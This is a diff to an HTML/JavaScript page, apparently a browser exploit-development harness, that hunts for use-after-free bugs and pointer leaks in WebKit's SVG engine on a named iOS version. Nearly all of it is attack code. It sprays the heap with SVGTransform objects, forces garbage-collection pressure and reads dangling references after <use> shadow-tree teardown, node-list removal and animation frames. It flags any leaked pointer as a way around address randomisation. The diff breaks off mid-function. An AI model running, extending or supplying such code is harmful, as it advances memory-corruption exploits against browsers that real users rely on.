@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG v36 — UAF/Path/CSS-anim Pointer Hunt</title>
+<title>SVG v37 — Shadow/Use/Intersect/AnimRef Pointer Hunt</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{background:#000;color:#ccc;font-family:monospace;font-size:11px;padding:12px}
@@ -28,16 +28,16 @@ button:active{background:#0f0;color:#000}
 </style>
 </head>
 <body>
-<h1>▓ SVG v36 — UAF SPRAY / PATH OVERFLOW / CSS-ANIM SPLIT</h1>
-<h2>forced UAF spray · degenerate path solver · CSS @keyframes feColorMatrix animVal · iOS 26.5.2 / A16 arm64e</h2>
+<h1>▓ SVG v37 — SHADOW/USE/INTERSECT/ANIMREF</h1>
+<h2>use-element shadow teardown · getIntersectionList dangling · animVal frame ref · consolidate mid-anim · iOS 26.5.2 / A16 arm64e</h2>
 
 <div class="suite">
 <button id="btn-all" onclick="runAll()">★ RUN ALL</button>
-<button onclick="go('UA')">UA</button>
-<button onclick="go('GC')">GC</button>
-<button onclick="go('PT')">PT</button>
-<button onclick="go('CA')">CA</button>
-<button onclick="go('SP')">SP</button>
+<button onclick="go('SH')">SH</button>
+<button onclick="go('IL')">IL</button>
+<button onclick="go('AR')">AR</button>
+<button onclick="go('CM')">CM</button>
+<button onclick="go('WR')">WR</button>
 <button onclick="go('SU')">SU</button>
 <button id="btn-copy" onclick="copyAll()">⎘ Copy</button>
 <button onclick="clearOut()">✕</button>
@@ -46,6 +46,7 @@ button:active{background:#0f0;color:#000}
 
 <script>
 var NS='http://www.w3.org/2000/svg';
+var XLINK='http://www.w3.org/1999/xlink';
 
 var _fb=new ArrayBuffer(8);
 var _dv=new Float64Array(_fb);
@@ -58,7 +59,6 @@ function f64hex(f){
 }
 function fromHiLo(hi,lo){_uv[1]=hi>>>0;_uv[0]=lo>>>0;return _dv[0];}
 function f64hi(f){_dv[0]=f;return _uv[1];}
-function f64lo(f){_dv[0]=f;return _uv[0];}
 
 function classifyPtr(v){
   if(v===null||v===undefined||isNaN(v)||!isFinite(v))return null;
@@ -72,11 +72,13 @@ function classifyPtr(v){
 }
 function isWeird(v){
   if(v===null||v===undefined||isNaN(v)||!isFinite(v))return false;
-  if(v===0||v===1||v===-1||v===2||v===3)return false;
+  if(v===0||v===1||v===-1)return false;
   _dv[0]=v; var hi=_uv[1];
-  // skip clean floats that look like normal SVG values
-  if(hi>=0x40000000&&hi<=0x40ffffff)return false; // 2..16M normal range
-  if(hi>=0x3f000000&&hi<=0x3fffffff)return false; // 0.5..1.0
+  if((hi&0xFFF00000)===0x40000000)return false; // 2.0–3.99
+  if((hi&0xFFF00000)===0x40100000)return false; // 4.0–7.99
+  if((hi&0xFFF00000)===0x40200000)return false; // 8.0–15.99
+  if((hi&0xFF000000)===0x40000000)return false; // 2–64 clean range
+  if((hi&0xFF000000)===0x3F000000)return false; // 0.5–1 clean
   return true;
 }
 
@@ -99,567 +101,604 @@ function copyAll(){
 function go(s){clearOut();window['run'+s]();}
 function runAll(){
   clearOut();
-  runUA();
-  setTimeout(function(){runGC();},2000);
-  setTimeout(function(){runPT();},4000);
-  setTimeout(function(){runCA();},6000);
-  setTimeout(function(){runSP();},9000);
-  setTimeout(function(){runSU();},11000);
+  runSH();
+  setTimeout(function(){runIL();},2000);
+  setTimeout(function(){runAR();},4500);
+  setTimeout(function(){runCM();},7500);
+  setTimeout(function(){runWR();},10000);
+  setTimeout(function(){runSU();},12000);
 }
 
 function mkSVG(w,h,vb){
   var s=document.createElementNS(NS,'svg');
-  s.setAttribute('width',w||200);s.setAttribute('height',h||200);
+  s.setAttribute('width',w||300);s.setAttribute('height',h||300);
   if(vb)s.setAttribute('viewBox',vb);
-  s.style.cssText='position:fixed;left:0;top:0;width:'+(w||200)+'px;height:'+(h||200)+'px;opacity:0.001;pointer-events:none';
+  s.style.cssText='position:fixed;left:0;top:0;width:'+(w||300)+'px;height:'+(h||300)+'px;opacity:0.001;pointer-events:none';
   document.body.appendChild(s);return s;
 }
 function mkEl(p,tag,attrs){
   var e=document.createElementNS(NS,tag);
-  if(attrs)Object.keys(attrs).forEach(function(k){e.setAttribute(k,attrs[k]);});
+  if(attrs)Object.keys(attrs).forEach(function(k){
+    if(k==='xhref')e.setAttributeNS(XLINK,'href',attrs[k]);
+    else e.setAttribute(k,attrs[k]);
+  });
   p.appendChild(e);return e;
 }
+function ctm(el){try{return el.getScreenCTM();}catch(e){return null;}}
+function bcr(el){try{return el.getBoundingClientRect();}catch(e){return null;}}
 
 // ════════════════════════════════════════════════════════════════════════
-// UA — forced UAF via replaceItem + GC spray
-// v35 showed old ref survives replaceItem with our canary intact
-// now: replace → GC spray → read old ref → does it now show spray data?
-// key: if the C++ SVGTransform backing is freed but JS ref is dangling,
-//      the freed slot may be reused by our spray allocations
+// SH — SVGUseElement shadow tree teardown
+// <use> clones the referenced element into a shadow tree
+// get refs to shadow tree matrices → detach <use> → read dangling refs
+// if shadow tree is torn down but JS refs survive: UAF
 // ════════════════════════════════════════════════════════════════════════
-function runUA(){
-  hdr('UA: forced UAF — replaceItem + GC spray');
+function runSH(){
+  hdr('SH: SVGUseElement shadow tree teardown UAF');
   var svg=mkSVG(300,300);
-
-  // UA[1]: baseline — confirm old ref survives replace (from v35)
-  hdr('UA[1]: baseline replaceItem survival check');
-  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
-  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  var txList=r.transform.baseVal;
-  var orig=txList.getItem(0);
-  var canary=fromHiLo(0xAAAAAAAA,0xAAAAAAAA);
-  orig.matrix.e=canary;
-  orig.matrix.f=fromHiLo(0xBBBBBBBB,0xBBBBBBBB);
-
-  var replacer=svg.createSVGTransform();
-  replacer.matrix.e=fromHiLo(0xCCCCCCCC,0xCCCCCCCC);
-  txList.replaceItem(replacer,0);
-
-  // read before any GC pressure
-  var preGC_e=null;
-  try{preGC_e=orig.matrix.e;}catch(e){preGC_e='THROWS';}
-  log('UA[1]: pre-GC old ref: e='+f64hex(preGC_e)+' (canary='+(preGC_e===canary)+')',
-    preGC_e===canary?'star — OLD REF RETAINS CANARY before GC':'info');
-
-  // UA[2]: now apply GC pressure — spray SVGMatrix allocations into freed space
-  hdr('UA[2]: GC pressure spray after replaceItem');
-
-  // drop references to SVG elements to let GC collect
-  // then immediately spray a known pattern into new SVGTransform allocations
-  var sprayVal=fromHiLo(0xDEADC0DE,0xFEEDFACE);
-  var sprays=[];
-  for(var i=0;i<500;i++){
-    var st=svg.createSVGTransform();
-    st.matrix.e=sprayVal;
-    st.matrix.f=sprayVal;
-    st.matrix.a=sprayVal;
-    sprays.push(st);
-  }
-
-  // force GC attempt via memory pressure
-  var pressure=[];
-  for(var i=0;i<1000;i++){pressure.push(new Float64Array(1024));}
-  pressure=null;
-
-  // read old ref again after spray
-  var postGC_e=null;
-  try{postGC_e=orig.matrix.e;}catch(e){postGC_e='THROWS';}
-  var postGC_f=null;
-  try{postGC_f=orig.matrix.f;}catch(e){postGC_f='THROWS';}
-
-  log('UA[2]: post-spray old ref: e='+f64hex(postGC_e)+' f='+f64hex(postGC_f),
-    typeof postGC_e==='number'&&postGC_e!==canary?
-    postGC_e===sprayVal?'uaf — SPRAY VALUE IN OLD REF: UAF CONFIRMED!':
-    'crit — OLD REF CHANGED TO: '+f64hex(postGC_e)+' — HEAP DATA LEAK!':
-    'info — still canary: ref counted, backing alive');
-
-  // UA[3]: try removing from list too — does removeItem change ref behavior?
-  hdr('UA[3]: removeItem then read detached ref');
-  var r3=mkEl(svg,'rect',{x:'0',y:'0',width:'10',height:'10'});
-  r3.setAttribute('transform','matrix(1 0 0 1 0 0)');
-  var txList3=r3.transform.baseVal;
-  var detach=txList3.getItem(0);
-  detach.matrix.e=fromHiLo(0x11223344,0x55667788);
-  detach.matrix.f=fromHiLo(0x99AABBCC,0xDDEEFF00);
-
-  try{txList3.removeItem(0);}catch(e){}
-
-  // spray again
-  var sprays3=[];
-  for(var i=0;i<500;i++){
-    var st3=svg.createSVGTransform();
-    st3.matrix.e=sprayVal;
-    sprays3.push(st3);
-  }
-
-  var after_e=null;
-  try{after_e=detach.matrix.e;}catch(e){after_e='THROWS';}
-  log('UA[3]: removeItem then spray: old ref e='+f64hex(after_e),
-    typeof after_e==='number'&&after_e!==fromHiLo(0x11223344,0x55667788)?
-    after_e===sprayVal?'uaf — REMOVEITEM UAF: SPRAY IN DETACHED REF!':
-    'crit — DETACHED REF CHANGED: '+f64hex(after_e):
-    'info — still our value: ARC protecting backing');
-
-  svg.remove();
-  prog('UA done');
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// GC — aggressive GC pressure + orphaned SVGMatrix refs
-// create many SVGMatrix objects, drop all JS references,
-// force GC, then read the matrix fields via still-held refs
-// SVGMatrix != SVGTransform — no list retention
-// ════════════════════════════════════════════════════════════════════════
-function runGC(){
-  hdr('GC: orphaned SVGMatrix GC pressure read');
-  var svg=mkSVG(200,200);
-
-  // GC[1]: SVGMatrix.multiply / inverse / translate
-  // These return NEW SVGMatrix objects — do the returned matrices contain internals?
-  hdr('GC[1]: SVGMatrix method returns — new object internals?');
-  var mx=svg.createSVGMatrix();
-  mx.e=fromHiLo(0xAAAAAAAA,0xAAAAAAAA);
-  mx.f=fromHiLo(0xBBBBBBBB,0xBBBBBBBB);
-
-  // multiply returns a new SVGMatrix
-  var mx2=svg.createSVGMatrix();
-  mx2.a=1; mx2.d=1;
-  var product=null;
-  try{product=mx.multiply(mx2);}catch(e){}
-  if(product){
-    ['a','b','c','d','e','f'].forEach(function(f){
-      var v=product[f];
-      var p=classifyPtr(v);
-      if(p||isWeird(v)){
-        log('GC[1]: multiply result.'+f+'='+f64hex(v),
-          p?'ptr — POINTER IN MULTIPLY RESULT! type='+p.type:'warn — '+v);
-      }
-    });
-    log('GC[1]: multiply result: e='+f64hex(product.e)+' (should be canary='+f64hex(mx.e)+')',
-      product.e===mx.e?'star — multiply propagates our value exactly':'info');
-  }
-
-  // GC[2]: inverse() — does matrix inversion expose internal arithmetic?
-  hdr('GC[2]: SVGMatrix.inverse() internal values');
-  var mx3=svg.createSVGMatrix();
-  mx3.a=2; mx3.d=2; mx3.e=fromHiLo(0x40000000,0x00000001); mx3.f=0;
-  var inv=null;
-  try{inv=mx3.inverse();}catch(e){log('GC[2]: inverse threw: '+e,'warn');}
-  if(inv){
-    ['a','b','c','d','e','f'].forEach(function(f){
-      var v=inv[f];
-      var p=classifyPtr(v);
-      if(p){log('GC[2]: inverse.'+f+'='+f64hex(v)+' type='+p.type,'ptr — POINTER IN INVERSE RESULT!');}
-    });
-    log('GC[2]: inverse: a='+inv.a+' e='+inv.e+' (expected: a=0.5 e=-(0.5*e_orig))','info');
-  }
-
-  // GC[3]: flipX/flipY — simple transforms, do they expose backing?
-  hdr('GC[3]: SVGMatrix.flipX/flipY — do returned objects have initialized fields?');
-  var mx4=svg.createSVGMatrix();
-  mx4.e=fromHiLo(0x11111111,0x11111111);
-  var flipped=null;
-  try{flipped=mx4.flipX();}catch(e){}
-  if(flipped){
-    ['e','f'].forEach(function(f){
-      var v=flipped[f];
-      var p=classifyPtr(v);
-      if(p||isWeird(v)){
-        log('GC[3]: flipX result.'+f+'='+f64hex(v),
-          p?'ptr — POINTER IN FLIPX RESULT!':'warn — '+v);
-      }
-    });
-    log('GC[3]: flipX result: e='+f64hex(flipped.e)+' f='+f64hex(flipped.f),'info');
-  }
-
-  // GC[4]: SVGPoint.matrixTransform — another method returning new object
-  hdr('GC[4]: SVGPoint.matrixTransform return value internals');
-  var pt=svg.createSVGPoint();
-  pt.x=fromHiLo(0x40000000,0x00000001);
-  pt.y=0;
-  var mx5=svg.createSVGMatrix();
-  mx5.a=1; mx5.d=1; mx5.e=fromHiLo(0x40100000,0x00000001);
-  var xformed=null;
-  try{xformed=pt.matrixTransform(mx5);}catch(e){}
-  if(xformed){
-    var xp=classifyPtr(xformed.x);
-    var yp=classifyPtr(xformed.y);
-    log('GC[4]: matrixTransform result: x='+f64hex(xformed.x)+' y='+f64hex(xformed.y),
-      xp||yp?'ptr — POINTER IN POINT RESULT! x_type='+(xp?xp.type:'clean')+' y_type='+(yp?yp.type:'clean'):
-      'info — x='+xformed.x+' y='+xformed.y);
-  }
-
-  svg.remove();
-  prog('GC done');
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// PT — degenerate path solver
-// SVGPathElement.getTotalLength() / getPointAtLength() with:
-//   - Infinity coordinates
-//   - NaN coordinates
-//   - 1e308 (near-max f64)
-//   - zero-length degenerate segments
-//   - self-intersecting giant paths
-// does the path geometry engine expose internal accumulator values?
-// ════════════════════════════════════════════════════════════════════════
-function runPT(){
-  hdr('PT: degenerate path solver probe');
-  var svg=mkSVG(200,200);
-
-  function probePathLen(desc, d){
-    var path=mkEl(svg,'path',{d:d,fill:'none',stroke:'red'});
-    var len=null;
-    try{len=path.getTotalLength();}catch(e){len='THROWS: '+e.name;}
-    var p=classifyPtr(typeof len==='number'?len:null);
-    log('PT: '+desc+': len='+( typeof len==='number'?f64hex(len)+' ('+len+')':len),
-      p?'ptr — POINTER IN PATH LENGTH! type='+p.type:
-      typeof len==='number'&&isWeird(len)?'star — weird length: '+len:
-      'info');
-    if(typeof len==='number'&&len>0&&len<1e300){
-      // probe a few points
-      [0, len*0.25, len*0.5, len*0.75, len-1].forEach(function(t){
-        var pt=null;
-        try{pt=path.getPointAtLength(t);}catch(e){}
-        if(pt){
-          var xp=classifyPtr(pt.x);
-          var yp=classifyPtr(pt.y);
-          if(xp||yp||isWeird(pt.x)||isWeird(pt.y)){
-            log('PT: '+desc+' @t='+t.toExponential(2)+': x='+f64hex(pt.x)+' y='+f64hex(pt.y),
-              xp||yp?'ptr — POINTER IN PATH POINT!':
-              'star — weird coords: x='+pt.x+' y='+pt.y);
-          }
-        }
-      });
-    }
-    path.remove();
-  }
-
-  // PT[1]: near-max f64 coordinates
-  hdr('PT[1]: near-max f64 path coordinates (1e308)');
-  probePathLen('1e308 L','M 0 0 L 1e308 0');
-  probePathLen('1e308 triangle','M 0 0 L 1e308 0 L 0 1e308 Z');
-
-  // PT[2]: bezier with extreme control points
-  hdr('PT[2]: bezier extreme control points');
-  probePathLen('cubic bezier 1e15','M 0 0 C 1e15 0 1e15 1e15 0 1e15');
-  probePathLen('quadratic bezier 1e15','M 0 0 Q 1e15 0 0 1e15');
-
-  // PT[3]: self-referential / degenerate
-  hdr('PT[3]: degenerate zero-length segments');
-  probePathLen('zero-length M','M 0 0 M 0 0 M 0 0 L 1 1');
-  probePathLen('collinear 1e15','M 0 0 L 1e15 0 L 2e15 0 L 3e15 0');
-
-  // PT[4]: arc with extreme radius
-  hdr('PT[4]: arc with extreme radius');
-  probePathLen('arc 1e15 radius','M 0 0 A 1e15 1e15 0 0 1 1e15 0');
-
-  // PT[5]: path with negative coords and mixed overflow
-  hdr('PT[5]: mixed negative extreme coords');
-  probePathLen('mixed extremes','M -1e15 -1e15 L 1e15 1e15 L -1e15 1e15 Z');
-
-  svg.remove();
-  prog('PT done');
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// CA — CSS @keyframes animation on feColorMatrix values
-// animVal/baseVal split confirmed in v35 for SMIL
-// now try CSS animation on a filter attribute — does CSS animation
-// initialize the animated buffer differently from SMIL?
-// CSS uses a different compositor path (CSSAnimationController vs SMIL)
-// ════════════════════════════════════════════════════════════════════════
-function runCA(){
-  hdr('CA: CSS @keyframes feColorMatrix animVal split');
-
-  // inject CSS animation keyframes
-  var style=document.createElement('style');
-  style.textContent=
-    '@keyframes colorShift {'+
-    '  0%   { values: "1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0"; }'+
-    '  50%  { values: "0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 1 0"; }'+
-    '  100% { values: "1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0"; }'+
-    '}'+
-    '.animated-filter { animation: colorShift 1s linear infinite; }';
-  document.head.appendChild(style);
-
-  var svg=mkSVG(200,200);
   var defs=mkEl(svg,'defs');
-  var filter=mkEl(defs,'filter',{id:'caf1'});
-  var feColor=mkEl(filter,'feColorMatrix',{
-    type:'matrix',
-    values:'1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0'
+
+  // create source element with known matrix
+  var src=mkEl(defs,'rect',{id:'src1',x:'10',y:'10',width:'50',height:'50'});
+  src.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  var srcMX=src.transform.baseVal.getItem(0).matrix;
+  srcMX.e=fromHiLo(0xAAAAAAAA,0xAAAAAAAA);
+  srcMX.f=fromHiLo(0xBBBBBBBB,0xBBBBBBBB);
+
+  // create <use> element referencing src
+  var useEl=mkEl(svg,'use',{xhref:'#src1',x:'0',y:'0'});
+
+  // SH[1]: read shadow root element's CTM — does it expose shadow matrix?
+  hdr('SH[1]: use element CTM vs source CTM');
+  var useCTM=ctm(useEl);
+  var srcCTM=ctm(src);
+  log('SH[1]: use CTM.e='+(useCTM?f64hex(useCTM.e):'null')+
+    ' src CTM.e='+(srcCTM?f64hex(srcCTM.e):'null'),'info');
+
+  // SH[2]: try to get the shadow element directly
+  // In older WebKit, shadowRoot may be accessible
+  hdr('SH[2]: shadow root access attempt');
+  var shadow=null;
+  try{shadow=useEl.shadowRoot;}catch(e){log('SH[2]: shadowRoot threw: '+e,'warn');}
+  log('SH[2]: shadowRoot='+shadow,'info');
+
+  // SH[3]: getScreenCTM on use element's instance tree
+  // SVGUseElement.instanceRoot / animatedInstanceRoot
+  hdr('SH[3]: instanceRoot access');
+  var instRoot=null;
+  try{instRoot=useEl.instanceRoot||useEl.animatedInstanceRoot;}catch(e){}
+  log('SH[3]: instanceRoot='+instRoot,'info');
+  if(instRoot){
+    // instanceRoot is SVGElementInstance — read its transform
+    try{
+      var instEl=instRoot.correspondingElement;
+      if(instEl){
+        var instCTM=ctm(instEl);
+        log('SH[3]: instance element CTM.e='+(instCTM?f64hex(instCTM.e):'null'),'info');
+        // get matrix from instance element
+        if(instEl.transform&&instEl.transform.baseVal.numberOfItems>0){
+          var instMX=instEl.transform.baseVal.getItem(0).matrix;
+          log('SH[3]: instance matrix.e='+f64hex(instMX.e)+
+            ' matches src canary='+(instMX.e===srcMX.e),
+            instMX.e===srcMX.e?'star — instance matrix IS src matrix (shared backing!)':'info');
+          // keep ref to instance matrix
+          var savedInstMX=instMX;
+          // now detach the use element
+          useEl.remove();
+          // read saved ref after detach
+          var afterDetach=null;
+          try{afterDetach=savedInstMX.e;}catch(e){afterDetach='THROWS';}
+          log('SH[3]: after use.remove() — saved instMX.e='+f64hex(afterDetach),
+            typeof afterDetach==='number'&&afterDetach!==srcMX.e?
+            'uaf — INSTANCE MATRIX CHANGED AFTER USE REMOVAL: UAF!':
+            typeof afterDetach==='number'&&afterDetach===srcMX.e?
+            'star — canary survives use.remove()':
+            'info — '+afterDetach);
+        }
+      }
+    }catch(e){log('SH[3]: instance access threw: '+e,'warn');}
+  }
+
+  // SH[4]: multiple use elements sharing one source — cascade teardown
+  hdr('SH[4]: cascade teardown — multi-use shared source');
+  var src2=mkEl(defs,'rect',{id:'src2',x:'0',y:'0',width:'20',height:'20'});
+  src2.setAttribute('transform','matrix(1 0 0 1 0 0)');
+  var canary2=fromHiLo(0xDEAD0002,0xBEEF0002);
+  src2.transform.baseVal.getItem(0).matrix.e=canary2;
+
+  var uses=[];
+  for(var i=0;i<10;i++){
+    var u=mkEl(svg,'use',{xhref:'#src2',x:''+i*25,y:'0'});
+    uses.push(u);
+  }
+
+  // get CTMs from all use elements before removal
+  var preCTMs=uses.map(function(u){return ctm(u);});
+
+  // remove source from defs while uses are still present
+  src2.remove();
+
+  // try to read CTMs after source removal
+  var changedCount=0;
+  uses.forEach(function(u,i){
+    var postCTM=ctm(u);
+    var pre=preCTMs[i];
+    if(postCTM&&pre){
+      var diff=Math.abs(postCTM.e-pre.e);
+      if(diff>0.001){
+        changedCount++;
+        var p=classifyPtr(postCTM.e);
+        log('SH[4]: use['+i+'] CTM.e changed: before='+f64hex(pre.e)+' after='+f64hex(postCTM.e),
+          p?'ptr — POINTER IN CTM AFTER SOURCE REMOVAL!':'crit — VALUE CHANGED: '+f64hex(postCTM.e));
+      }
+    }
   });
-  feColor.classList.add('animated-filter');
-  mkEl(svg,'rect',{x:'0',y:'0',width:'50',height:'50',fill:'red',filter:'url(#caf1)'});
+  log('SH[4]: '+changedCount+'/'+uses.length+' use CTMs changed after src.remove()',
+    changedCount>0?'crit — USE CTMS CHANGED AFTER SOURCE REMOVED!':'info');
 
-  // CA[1]: sample animVal during CSS animation
-  hdr('CA[1]: CSS animated feColorMatrix values animVal vs baseVal');
+  svg.remove();
+  prog('SH done');
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// IL — getIntersectionList / getEnclosureList dangling ref
+// these return a live SVGNodeList
+// get the list → mutate DOM → read list items → dangling?
+// ════════════════════════════════════════════════════════════════════════
+function runIL(){
+  hdr('IL: getIntersectionList/getEnclosureList dangling ref probe');
+  var svg=mkSVG(300,300);
+  svg.style.cssText='position:fixed;left:0;top:0;width:300px;height:300px;opacity:0.5;pointer-events:none';
+
+  // create several rects in the intersection zone
+  var rects=[];
+  for(var i=0;i<8;i++){
+    var r=mkEl(svg,'rect',{
+      x:''+(i*20), y:'0', width:'50',height:'50',fill:'red'
+    });
+    r.setAttribute('transform','matrix(1 0 0 1 0 0)');
+    r.transform.baseVal.getItem(0).matrix.e=fromHiLo(0xDEAD0000+i,0xBEEF0000+i);
+    rects.push(r);
+  }
+
+  // IL[1]: getIntersectionList
+  hdr('IL[1]: getIntersectionList — get list then remove elements');
+  var intersectRect=svg.createSVGRect();
+  intersectRect.x=0; intersectRect.y=0;
+  intersectRect.width=300; intersectRect.height=300;
+
+  var nodeList=null;
+  try{nodeList=svg.getIntersectionList(intersectRect,null);}catch(e){
+    log('IL[1]: getIntersectionList threw: '+e,'warn');
+  }
+
+  if(nodeList){
+    log('IL[1]: initial list length='+nodeList.length,'info');
+    // save refs to items
+    var savedItems=[];
+    for(var i=0;i<nodeList.length;i++){
+      savedItems.push(nodeList.item(i));
+    }
+
+    // read transforms before removal
+    var preMXs=savedItems.map(function(el){
+      if(!el||!el.transform||el.transform.baseVal.numberOfItems===0)return null;
+      return el.transform.baseVal.getItem(0).matrix.e;
+    });
+
+    // now remove all rects from DOM
+    rects.forEach(function(r){r.remove();});
+
+    // force GC pressure
+    var p=[];for(var i=0;i<1000;i++)p.push(new Float64Array(512));p=null;
+
+    // read saved item refs after removal
+    hdr('IL[1]: reading saved items after DOM removal');
+    var changedCount=0;
+    savedItems.forEach(function(el,i){
+      var postE=null;
+      try{
+        if(el&&el.transform&&el.transform.baseVal.numberOfItems>0){
+          postE=el.transform.baseVal.getItem(0).matrix.e;
+        }
+      }catch(e){postE='THROWS: '+e.name;}
+      var pre=preMXs[i];
+      if(postE!==pre){
+        changedCount++;
+        var p2=classifyPtr(typeof postE==='number'?postE:null);
+        log('IL[1]: savedItem['+i+'] changed: pre='+f64hex(pre)+' post='+f64hex(postE),
+          p2?'ptr — POINTER IN DETACHED NODE LIST ITEM! type='+p2.type:
+          'uaf — VALUE CHANGED AFTER REMOVAL: '+f64hex(postE));
+      }
+    });
+    log('IL[1]: '+changedCount+'/'+savedItems.length+' items changed after removal',
+      changedCount>0?'uaf — NODELIST UAF DETECTED!':'info — all stable');
+
+    // IL[2]: read the nodeList itself after mutations
+    hdr('IL[2]: nodeList.length after DOM mutations');
+    try{
+      log('IL[2]: nodeList.length after removal='+nodeList.length,
+        'info — list updated: '+nodeList.length);
+    }catch(e){log('IL[2]: nodeList.length threw: '+e,'warn');}
+  }
+
+  // IL[3]: getEnclosureList — slightly different query
+  hdr('IL[3]: getEnclosureList dangling ref');
+  var rects3=[];
+  for(var i=0;i<5;i++){
+    var r3=mkEl(svg,'rect',{x:''+(i*10),y:'0',width:'10',height:'10',fill:'blue'});
+    r3.setAttribute('transform','matrix(1 0 0 1 0 0)');
+    r3.transform.baseVal.getItem(0).matrix.e=fromHiLo(0xC0FFEE00+i,0xC0FFEE00+i);
+    rects3.push(r3);
+  }
+
+  var eList=null;
+  try{eList=svg.getEnclosureList(intersectRect,null);}catch(e){}
+  if(eList&&eList.length>0){
+    var eItem=eList.item(0);
+    var preMX=null;
+    try{preMX=eItem.transform.baseVal.getItem(0).matrix.e;}catch(e){}
+    log('IL[3]: enclosure list length='+eList.length+' item[0].mx.e='+f64hex(preMX),'info');
+
+    // remove all rects
+    rects3.forEach(function(r){r.remove();});
+    var p3=[];for(var i=0;i<1000;i++)p3.push(new Float64Array(512));p3=null;
+
+    var postMX=null;
+    try{postMX=eItem.transform.baseVal.getItem(0).matrix.e;}catch(e){postMX='THROWS';}
+    log('IL[3]: after enclosure elements removed: item[0].mx.e='+f64hex(postMX),
+      postMX!==preMX?'uaf — ENCLOSURE LIST UAF!':'info — stable');
+  }
+
+  svg.remove();
+  prog('IL done');
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// AR — animVal frame ref: get transform from animVal during one rAF frame
+// save the specific SVGTransform object from animVal.getItem(0)
+// on NEXT frame, the animation advances — does the saved ref
+// point to the previous frame's (now stale) matrix?
+// ════════════════════════════════════════════════════════════════════════
+function runAR(){
+  hdr('AR: animVal frame-ref stale read');
+  var svg=mkSVG(200,200);
+  var r=mkEl(svg,'rect',{x:'0',y:'0',width:'20',height:'20',fill:'red'});
+  r.setAttribute('transform','matrix(1 0 0 1 0 0)');
+
+  // start SMIL animation
+  var anim=mkEl(r,'animateTransform',{
+    attributeName:'transform',
+    type:'translate',
+    from:'0 0',
+    to:'500 0',
+    dur:'0.5s',
+    repeatCount:'indefinite'
+  });
+
+  // AR[1]: capture animVal transform ref across frames
+  hdr('AR[1]: animVal transform object identity across frames');
+  var frameRefs=[];
+  var frameVals=[];
+  var frameCount=0;
   var startT=performance.now();
-  var caSamples=[];
 
-  function caSample(){
+  function captureFrame(){
     var elapsed=performance.now()-startT;
-    if(elapsed>2000){
-      prog('CA done');
-      hdr('CA[1]: results after 2s sampling');
-      var splits=caSamples.filter(function(s){return s.split;});
-      var weirdSamples=caSamples.filter(function(s){return s.weird;});
-      log('CA[1]: total samples='+caSamples.length+' splits='+splits.length+' weird='+weirdSamples.length,
-        splits.length>0?'star — ANIMVAL SPLIT DETECTED during CSS anim':
-        'info — no animVal split seen');
+    if(elapsed>800){
+      // analyze captured refs
+      prog('AR[1]: analyzing '+frameRefs.length+' captured refs');
+      hdr('AR[1]: cross-frame ref analysis');
 
-      weirdSamples.forEach(function(s){
-        log('CA[1]: weird animVal at t='+s.t.toFixed(0)+'ms: idx='+s.idx+' av='+f64hex(s.av),
-          classifyPtr(s.av)?'ptr — POINTER IN ANIMVAL!':'star — '+s.av);
+      // read all saved refs NOW (after animation has advanced)
+      var changedCount=0;
+      var ptrCount=0;
+      frameRefs.forEach(function(ref,i){
+        var nowVal=null;
+        try{nowVal=ref.matrix.e;}catch(e){nowVal='THROWS';}
+        var atCapture=frameVals[i];
+        if(nowVal!==atCapture){
+          changedCount++;
+          var p=classifyPtr(typeof nowVal==='number'?nowVal:null);
+          if(p){
+            ptrCount++;
+            log('AR[1]: frame['+i+'] REF CHANGED+POINTER! capture='+f64hex(atCapture)+' now='+f64hex(nowVal)+' type='+p.type,
+              'aslr — ANIMVAL FRAME REF LEAKED POINTER! type='+p.type);
+          } else {
+            log('AR[1]: frame['+i+'] changed: capture='+atCapture.toFixed(4)+' now='+(typeof nowVal==='number'?nowVal.toFixed(4):nowVal),
+              'star — REF CHANGED: stale backing value');
+          }
+        }
       });
+      log('AR[1]: '+changedCount+'/'+frameRefs.length+' refs changed, '+ptrCount+' ptrs',
+        ptrCount>0?'aslr — FRAME REF POINTER LEAK!':
+        changedCount>0?'star — REFS ARE STALE: animation machinery freed old frames':
+        'info — all refs stable (animation updates same object)');
 
-      // CA[2]: try to get the SVGNumberList animVal during animation
-      hdr('CA[2]: SVGNumberList animVal vs baseVal object identity');
-      var bv=feColor.values.baseVal;
-      var av=feColor.values.animVal;
-      log('CA[2]: baseVal===animVal: '+(bv===av),
-        bv!==av?'star — DIFFERENT OBJECTS: CSS animation split is active!':'info — same object');
-      if(bv!==av){
-        // read individual numbers from animVal
-        for(var i=0;i<Math.min(av.numberOfItems,20);i++){
-          var avNum=av.getItem(i);
-          var bvNum=bv.getItem(i);
-          if(avNum.value!==bvNum.value){
-            log('CA[2]: animVal['+i+']='+f64hex(avNum.value)+' baseVal['+i+']='+f64hex(bvNum.value),
-              classifyPtr(avNum.value)?'ptr — POINTER IN ANIMVAL NUMBER!':
-              'star — values differ: av='+avNum.value+' bv='+bvNum.value);
+      // AR[2]: object identity check across frames
+      hdr('AR[2]: are animVal transform objects the same across frames?');
+      if(frameRefs.length>=2){
+        var allSame=frameRefs.every(function(r){return r===frameRefs[0];});
+        log('AR[2]: all '+frameRefs.length+' captured animVal tx objects same='+allSame,
+          !allSame?'star — DIFFERENT OBJECTS ACROSS FRAMES: new allocation each frame!':
+          'info — same object across frames (animation updates in place)');
+        if(!allSame){
+          // find first pair that differs
+          for(var i=1;i<frameRefs.length;i++){
+            if(frameRefs[i]!==frameRefs[0]){
+              log('AR[2]: frame[0]!==frame['+i+']: new SVGTransform objects allocated per frame!','star');
+              break;
+            }
           }
         }
       }
 
-      style.remove();
+      anim.remove();
       svg.remove();
+      prog('AR done');
       return;
     }
 
-    // sample feColorMatrix values animVal
+    // capture this frame's animVal transform object
     try{
-      var bv=feColor.values.baseVal;
-      var av=feColor.values.animVal;
-      var split=(bv!==av);
